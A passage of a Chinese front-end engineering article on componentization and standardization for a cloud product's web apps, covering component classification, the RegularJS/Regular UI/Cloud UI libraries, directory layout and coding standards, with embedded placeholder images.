<p>考虑到从预处理器迁移为CSS Modules的成本较高，这块内容暂时不做调整。不过有意向在新的项目中实践PostCSS + CSS Modules。</p>
<p><strong>技术选型：MCSS</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p><strong>组件化</strong></p>
<p>“现代化生产的分工协作要求工业部件遵循互换性原则。”</p>
<p>当前最火的React带头掀起了组件化浪潮，随后Vue、Polymer、Angular2等各种组件化框架/类库如雨后春笋般出现，我们公司@郑海波写的RegularJS（<a href="https://github.com/regularjs/regular）也是组件化框架的一面旗帜。" target="_blank" rel="external">https://github.com/regularjs/regular）也是组件化框架的一面旗帜。</a></p>
<p>那么，究竟什么是组件化？</p>
<p><strong>组件化的概念</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>首先，组件化≠模块化。好多人对这两个概念有些混淆。</p>
<p>模块化只是在语言层面上，对代码的拆分；而组件化是基于模块化，在设计层面上，对UI（用户界面）的拆分。</p>
<p>从UI拆分下来的每个包含模板(HTML)+样式(CSS)+逻辑(JS)功能完备的结构单元，我们称之为组件。</p>
<p>组件化除了要处理组件这种本身的封装，还要处理组件之间的逻辑(JS)继承，样式(CSS)扩展和模板(HTML)嵌套等关系。</p>
<p>因此，组件化实际上是一种按照模板(HTML)+样式(CSS)+逻辑(JS)三位一体的形式对面向对象的进一步抽象。</p>
<p>然后，我们再思考一个问题：为什么类React框架/类库是组件化的，而之前的框架/类库，如jQuery、Angular1等也有很多配套的组件，就不是组件化的呢？</p>
<p>React提倡的理念能给出答案：</p>
<p><strong>Keep Simple. Everything can be a component.</strong></p>
<p>这句话就是说页面上所有的东西都是组件。页面是个大型组件，可以拆成若干个中型组件，然后中型组件还可以再拆，拆成若干个小型组件，小型组件也可以再拆，直到拆成DOM元素为止。DOM元素可以看成是浏览器自身的组件，作为组件的基本单元。</p>
<p>这其实是一种分治（分而治之）思想。</p>
<p>传统前端框架/类库的思想是先组织DOM，然后把某些可复用的逻辑封装成组件来操作DOM，是DOM优先；而组件化框架/类库的思想是先按顶层设计来构思组件，然后用DOM这种基本单元结合相应逻辑来实现组件，是组件优先。这是两者本质的区别。</p>
<p>再看看客户端框架，像WinForm、WPF、Android等，它们从诞生的那天起就是组件化的。当年写客户端的日子比较舒服，就是因为没有类似DOM这样的繁琐操作。而前端领域发展曲折，传统框架只是面向WebPage的，随着Web业务日益复杂化和多元化，面向WebPage逐渐转成面向WebApp，传统框架已经不能很好的解决问题了，因此才从客户端框架经验中引入了组件化思想。</p>
<p>综上，<strong>组件化是一种在设计层面上，对项目中UI进行整体的疏理和拆解，再按照HTML+CSS+JS三位一体的面向对象来进行封装的过程或思想。</strong></p>
<p>按照组件化思想，我们改变了原来按照HTML、CSS、JS文件分开管理的策略，采取一个组件一个目录的原则。单个组件目录结构如下：</p>
<p>component/</p>
<pre><code>demo/

    index.md    # 组件文档

test/

    spec.js     # 单元测试

index.mcss      # 组件样式

index.js        # 组件逻辑

index.rgl       # 组件模板

index.json      # 组件信息
</code></pre><p>从理念上，我很认同Vue的*.vue这种单文件结构；但在实践上，我认为用一个目录来表示组件，功能性和扩展性会更强一些（比如要增加单元测试和组件文档等功能），而且多文件在编辑器中分栏编辑更加方便。</p>
<p><strong>组件的分类</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>按照组件的代码组成，组件可以分为：HTML、HTML+CSS、JS、HTML+JS、HTML+CSS+JS。</p>
<p>本文认为缺失JS的结构单元也是组件，比如仅有HTML+CSS的结构单元称为CSS组件。</p>
<p>按照组件的<strong>通用性（复用性）</strong>，组件可以分为以下三类：</p>
<ul>
<li>通用组件：不同产品间可以复用的组件。比如ListView（<a href="https://github.com/regular-ui/ui-listview），既可以在蜂巢中使用，也可以在别的产品中使用；" target="_blank" rel="external">https://github.com/regular-ui/ui-listview），既可以在蜂巢中使用，也可以在别的产品中使用；</a></li>
<li>通用业务组件：仅在同一产品中可以复用的组件。比如按照蜂巢视觉，对ListView进行了样式扩展的RepoCards，可以在蜂巢中多处使用，且能进一步扩展，但只能在蜂巢中使用；</li>
<li>业务组件：不可以复用的组件。比如具体场景中使用的组件，一次性的业务模块等。</li>
</ul>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>图2 蜂巢组件通用性示例</p>
<p>本文认为组件的一个设计原则是：<strong>在不增加组件配置复杂度的情况下，尽可能的提高组件通用性。</strong></p>
<p><strong>组件之间的关系</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>前面提到组件之间的关系有继承、扩展和嵌套，还有一种关系是包含，表示一个组件内部调用了另一个组件。这些关系都可以归属为依赖。</p>
<p>下面这张图展示了蜂巢的一部分组件和它们之间的依赖关系：</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>图3 蜂巢组件（部分）依赖关系图</p>
<p><strong>组件库</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p><strong>组件库是一系列组件的集合。</strong></p>
<p>因为本土优势，蜂巢的组件化框架使用了我们公司的RegularJS（<a href="https://github.com/regularjs/regular）；通用组件库使用了我写的Regular" target="_blank" rel="external">https://github.com/regularjs/regular）；通用组件库使用了我写的Regular</a> UI（<a href="https://regular-ui.github.io/index.html）。" target="_blank" rel="external">https://regular-ui.github.io/index.html）。</a></p>
<p>根据交互和视觉规范，蜂巢产品下的五个单页系统的组件风格是统一的，因此它们之间有很多通用业务组件可以共享。为了减少维护成本，我们在Regular UI的基础上，加上蜂巢的视觉样式和一些新的通用业务组件（图3中绿色的组件），再封装成一套专为云计算使用的Cloud UI组件库。</p>
<p>最后，蜂巢的组件化架构如下：</p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o3OxUxS3vkCn1qlcbG7VLb04vRY6ibmjMvh8DRtnKvOa91It4EXSicoaKA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p>图4 蜂巢组件化架构</p>
<p><strong>技术选型：RegularJS + Regular UI + Cloud UI</strong></p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o3bpvoP2l17DW3trJc8hhqdlNBicnibxU8YqrFcFpL07BpsBL4nqSK0y2w/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p><strong>规范化</strong></p>
<p>“现代工厂制度是工业革命发展的必然产物。”</p>
<p>模块化和组件化确定了开发模型，而这些东西的实现需要规范去落实。</p>
<p>在以前没有规范的日子里，我们的项目中一度出现过以下问题：</p>
<ul>
<li>各模块代码风格不一致。一个程序员接手另一个程序员的模块后要预热、理解甚至重构；</li>
<li>各模块对外接口不一致。比如有的模块输出对象、有的模块输出构造器，导致使用起来很混乱；</li>
<li>容易产生重复功能的模块和组件。比如有段时间蜂巢项目中同时存在4个相同功能的自定义Select组件的情形；</li>
<li>…</li>
</ul>
<p>这些问题的存在，已经降低了模块化和组件化的实用性。会大大影响开发效率，增加维护成本，进而会影响网页性能，产生隐藏的bug。</p>
<p>因此，我们也对团队的开发方式和开发流程进行了规范化改进。</p>
<p><strong>目录结构</strong></p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o3Hb6pPKykcZibiaia2qQ0r8blGyynhYC4P2YwBFZOBmnYTdRaFia3xH7qVQ/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p>上文中提到，按照组件化思想，我们对项目的目录结构进行了重新的梳理。现在目录结构如下：</p>
<p>src/                # 源文件</p>
<pre><code>base/           # 基础类库

common/         # 通用组件和通用业务组件

specific/       # 业务组件

module/         # 模块组件

page/           # 页面及入口css和js

service/        # 数据服务

icons/          # 图标源文件

    png/        # 雪碧图标源文件

    svg/        # 字体图标源文件

assets/         # 静态文件
</code></pre><p>dest/               # 生成文件</p>
<pre><code>css/

js/

img/

fonts/          # 图标字体和专用字体

vendor/         # 第三方库
</code></pre><p>node_modules/</p>
<pre><code>cloud-ui/       # Cloud UI组件库
</code></pre><p>package.json</p>
<p>.gitignore</p>
<p>.eslintrc           # eslint配置</p>
<p>…</p>
<p>源文件和目标文件完全分开，依赖统一用npm进行包管理。</p>
<p>common、specific和module三个目录存放组件：</p>
<ul>
<li>common存放通用组件和通用业务组件（大部分移入了Cloud UI）；</li>
<li>specific存放普通业务组件；</li>
<li>module存放业务模块组件。</li>
</ul>
<p><strong>编码规范</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>对项目中的各种语言，我们参考了Airbnb、Google等市面上比较通用的代码规范，再结合自己的代码特点，制定了相应的规范（<a href="https://regular-ui.github.io/start/rule.html）：" target="_blank" rel="external">https://regular-ui.github.io/start/rule.html）：</a></p>
<ul>
<li>命名规范</li>
<li>CSS/MCSS编码规范</li>
<li>JaveScript编码规范</li>
<li>Regular组件设计规范</li>
</ul>
<p><strong>Lint</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN